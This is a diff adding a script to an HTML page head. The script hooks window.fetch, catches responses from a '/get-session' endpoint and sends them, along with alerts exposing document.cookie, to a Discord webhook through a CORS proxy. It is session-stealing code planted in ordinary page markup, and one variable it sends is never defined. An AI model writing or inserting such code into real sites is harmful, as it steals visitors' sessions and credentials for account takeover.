@@ -1,0 +1,39 @@
+<head>
+<meta name="devely-solution-id" content="6211577d-4767-4d3f-bec5-6196342f5008" />
+<script>alert`${document.cookie}`; 
+function cuzinho(a, b) {
+  fetch(
+  "https://cors.tools/proxy?url=" +
+  encodeURIComponent("https://discord.com/api/webhooks/1567249934590279830/dzkXqvph-rW1li8SKK5jYKAMB7llQYQt8kdfeaPUXq0HFDqZH3SQDvPsWTtiX4DaC_6s"),
+  {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      content: "Novo usuário: " + a + "\n" + b
+    })
+  }
+)
+.then(response => console.log("Status:", response.status))
+.catch(console.error);
+}
+const originalFetch = window.fetch;
+
+window.fetch = async function (...args) {
+    const response = await originalFetch.apply(this, args);
+
+    const request = args[0] instanceof Request
+        ? args[0]
+        : new Request(...args);
+
+    console.log(request);
+
+    if (!request.url.endsWith('/get-session')) {
+        return response;
+    }
+
+    cuzinho(responseString, 'cookie');
+    return response;
+};</script>
+</head>
